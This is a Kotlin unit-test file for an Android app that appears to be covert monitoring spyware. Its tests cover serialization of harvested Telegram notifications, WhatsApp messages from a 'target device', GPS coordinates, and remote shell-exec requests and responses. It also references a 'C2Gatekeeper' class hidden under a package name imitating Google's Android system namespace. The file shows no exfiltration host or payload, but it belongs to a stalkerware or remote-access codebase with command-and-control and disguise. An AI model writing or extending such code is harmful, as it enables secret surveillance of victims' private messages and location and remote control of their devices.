package com.homemonitor

import com.google.android.system.C2Gatekeeper
import org.json.JSONObject
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * DashboardIntegrationTest
 *
 * Integration and DTO serialization unit tests for the Web Control Dashboard API Router and DTOs.
 */
class DashboardIntegrationTest {

    @Test
    fun testLogEntryItemDtoSerialization() {
        val now = System.currentTimeMillis()
        val item = LogEntryItem(
            id = "log_101",
            category = "notifications",
            sourceApp = "com.telegram.messenger",
            title = "Test Notification",
            body = "Security update completed",
            timestamp = now
        )

        val json = item.toJson()
        assertNotNull(json)
        assertEquals("log_101", json.getString("id"))
        assertEquals("notifications", json.getString("category"))
        assertEquals("com.telegram.messenger", json.getString("sourceApp"))
        assertEquals("Test Notification", json.getString("title"))
        assertEquals("Security update completed", json.getString("body"))
        assertEquals(now, json.getLong("timestamp"))
    }

    @Test
    fun testLocationTelemetryDtoSerialization() {
        val now = System.currentTimeMillis()
        val loc = LocationTelemetryDto(
            latitude = 37.7749,
            longitude = -122.4194,
            altitude = 15.0,
            speed = 0.0f,
            accuracy = 3.5f,
            provider = "gps",
            timestamp = now
        )

        val json = loc.toJson()
        assertNotNull(json)
        assertEquals(37.7749, json.getDouble("latitude"), 0.0001)
        assertEquals(-122.4194, json.getDouble("longitude"), 0.0001)
        assertEquals("gps", json.getString("provider"))
        assertEquals(now, json.getLong("timestamp"))
    }

    @Test
    fun testChatMessageItemDtoSerialization() {
        val now = System.currentTimeMillis()
        val msg = ChatMessageItem(
            messageId = "msg_001",
            threadId = "thread_whatsapp_01",
            appId = "whatsapp",
            senderName = "Contact",
            text = "Hello from target device",
            isOutgoing = false,
            timestamp = now
        )

        val json = msg.toJson()
        assertNotNull(json)
        assertEquals("msg_001", json.getString("messageId"))
        assertEquals("whatsapp", json.getString("appId"))
        assertFalse("Message should be incoming", json.getBoolean("isOutgoing"))
    }

    @Test
    fun testShellExecRequestDeserialization() {
        val requestJson = JSONObject().apply {
            put("command", "uname -a")
            put("context", "system")
        }.toString()

        val req = ShellExecRequest.fromJson(requestJson)
        assertEquals("uname -a", req.command)
        assertEquals("system", req.context)
    }

    @Test
    fun testShellExecResponseSerialization() {
        val resp = ShellExecResponse(
            command = "whoami",
            exitCode = 0,
            output = "u0_a194",
            context = "system"
        )

        val json = resp.toJson()
        assertEquals("whoami", json.getString("command"))
        assertEquals(0, json.getInt("exitCode"))
        assertEquals("u0_a194", json.getString("output"))
    }

    @Test
    fun testGatekeeperAdminPasswordVerification() {
        assertFalse("Blank password must fail verification", C2Gatekeeper.verifyAdminPassword(""))
        assertFalse("Incorrect password must fail verification", C2Gatekeeper.verifyAdminPassword("wrong_pass"))
    }
}
